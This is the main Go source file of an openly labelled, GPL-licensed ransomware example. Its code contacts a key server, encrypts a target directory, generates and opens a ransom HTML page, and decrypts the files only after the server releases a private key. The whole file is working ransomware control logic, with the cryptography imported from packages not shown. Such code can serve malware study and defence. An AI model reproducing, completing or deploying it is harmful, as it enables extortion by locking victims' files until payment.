/*
Ransomware example in Golang
Copyright (C) 2017 Gustavo Henrique

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>
*/
package main

import (
	"flag"
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/skratchdot/open-golang/open"

	"github.com/gustavohenrique/ransomware/cryptography"
	"github.com/gustavohenrique/ransomware/util"
)

const (
	SECONDS_TO_WAIT_WHEN_CONNECTION_FAILED  = 5
	SECONDS_TO_WAIT_WHEN_CONNECTION_SUCCESS = 15
)

var (
	encrypted bool
	decrypted bool
	targetDir string
)

func start(channel chan cryptography.ServerConfig) {
	serverUrl := os.Getenv("RANSOMWARE_URL")
	if serverUrl == "" {
		serverUrl = "http://localhost:7000"
	}
	for {
		config := util.GetServerConfig(channel, serverUrl)
		if hasPubKeyIn(config) || hasPrivKeyIn(config) {
			channel <- config
			go encryptOrDecrypt(channel)
			break
		} else {
			wait(SECONDS_TO_WAIT_WHEN_CONNECTION_FAILED)
		}
	}
}

func wait(seconds int) {
	time.Sleep(time.Duration(seconds) * time.Second)
}

func hasPubKeyIn(config cryptography.ServerConfig) bool {
	return config.PubKey.X != "" && config.PubKey.Y != ""
}

func hasPrivKeyIn(config cryptography.ServerConfig) bool {
	return config.PrivKey.D != ""
}

func encryptOrDecrypt(channel chan cryptography.ServerConfig) {
	config := <-channel
	if hasPrivKeyIn(config) && decrypted == false {
		decryptDir(targetDir, config)
		decrypted = true
	} else if encrypted == false && decrypted == false {
		encryptDir(targetDir, config)
		encrypted = true
	}
	wait(SECONDS_TO_WAIT_WHEN_CONNECTION_SUCCESS)
	go start(channel)
}

func encryptDir(targetDir string, config cryptography.ServerConfig) {
	fmt.Printf("Encrypting %s... ", targetDir)
	err := cryptography.EncryptDir(targetDir, config)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed encrypting "+targetDir+" !\n")
		os.Exit(1)
	}
	fmt.Println("Done.")
}

func decryptDir(targetDir string, config cryptography.ServerConfig) {
	fmt.Printf("Decrypting %s... ", targetDir)
	err := cryptography.DecryptDir(targetDir, config)
	if err != nil {
		fmt.Fprintf(os.Stderr, "Failed decrypting "+targetDir+" !\n")
		os.Exit(1)
	}
	fmt.Println("Done.")
}

func main() {
	flag.StringVar(&targetDir, "directory", os.TempDir(), "The directory that contains the files there will be encrypted")
	flag.Parse()

	baseDir := filepath.Dir(".")
	htmlFile := filepath.Join(baseDir, cryptography.RSW_HTML)
	err := util.GenerateRansomwareHtmlPage(htmlFile, targetDir)
	if err == nil {
		open.Start(htmlFile)
	}

	channel := make(chan cryptography.ServerConfig)
	go start(channel)
	go encryptOrDecrypt(channel)
	select {}
}
